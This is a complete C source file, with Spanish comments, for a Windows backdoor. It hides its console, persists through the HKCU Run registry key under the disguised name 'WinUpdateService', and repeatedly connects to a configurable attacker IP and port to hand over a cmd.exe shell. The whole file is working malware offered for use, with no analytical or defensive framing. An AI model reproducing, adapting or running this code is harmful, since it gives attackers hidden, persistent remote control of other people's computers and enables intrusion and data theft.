#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

// Configuración por defecto
char ATTACKER_IP[16] = "192.168.1.100";
int ATTACKER_PORT = 4444;
int RECONNECT_DELAY = 5000;
char SERVICE_NAME[256] = "WinUpdateService";

void establish_persistence() {
  HKEY hKey;
  char path[MAX_PATH];
  
  GetModuleFileName(NULL, path, MAX_PATH);
  
  if(RegOpenKeyEx(HKEY_CURRENT_USER, 
          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
    RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, 
           (BYTE*)path, strlen(path)+1);
    RegCloseKey(hKey);
  }
}

void reverse_shell() {
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in server;
  STARTUPINFO sinfo;
  PROCESS_INFORMATION pinfo;
  
  while(1) {
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
      Sleep(RECONNECT_DELAY);
      continue;
    }
    
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if(sock == INVALID_SOCKET) {
      WSACleanup();
      Sleep(RECONNECT_DELAY);
      continue;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    
    if(WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), 
          NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
      closesocket(sock);
      WSACleanup();
      Sleep(RECONNECT_DELAY);
      continue;
    }
    
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 
          CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(sock);
    WSACleanup();
    
    Sleep(RECONNECT_DELAY);
  }
}

void show_help() {
  printf("Uso: shell.exe [-ip IP] [-p PUERTO] [-rd DELAY] [-sn NOMBRE_SERVICIO]\n");
  printf("  -ip   IP del atacante (ej: 192.168.1.100)\n");
  printf("  -p    Puerto del atacante (ej: 4444)\n");
  printf("  -rd   Delay de reconexion en ms (ej: 5000)\n");
  printf("  -sn   Nombre del servicio para persistencia (ej: WinUpdateService)\n");
  printf("\nEjemplo: shell.exe -ip 10.0.0.5 -p 8080 -rd 3000 -sn \"Windows Update\"\n");
}

void parse_args(int argc, char* argv[]) {
  for(int i = 1; i < argc; i++) {
    if(strcmp(argv[i], "-ip") == 0 && i + 1 < argc) {
      strncpy(ATTACKER_IP, argv[i + 1], sizeof(ATTACKER_IP) - 1);
      ATTACKER_IP[sizeof(ATTACKER_IP) - 1] = '\0';
      i++;
    } 
    else if(strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
      ATTACKER_PORT = atoi(argv[i + 1]);
      i++;
    }
    else if(strcmp(argv[i], "-rd") == 0 && i + 1 < argc) {
      RECONNECT_DELAY = atoi(argv[i + 1]);
      i++;
    }
    else if(strcmp(argv[i], "-sn") == 0 && i + 1 < argc) {
      strncpy(SERVICE_NAME, argv[i + 1], sizeof(SERVICE_NAME) - 1);
      SERVICE_NAME[sizeof(SERVICE_NAME) - 1] = '\0';
      i++;
    }
    else if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
      show_help();
      exit(0);
    }
  }
}

int main(int argc, char* argv[]) {
  // Ocultar ventana de consola
  HWND hWnd = GetConsoleWindow();
  ShowWindow(hWnd, SW_HIDE);
  
  // Parsear argumentos
  parse_args(argc, argv);
  
  // Establecer persistencia
  establish_persistence();
  
  // Iniciar reverse shell con reconexión
  reverse_shell();
  
  return 0;
}
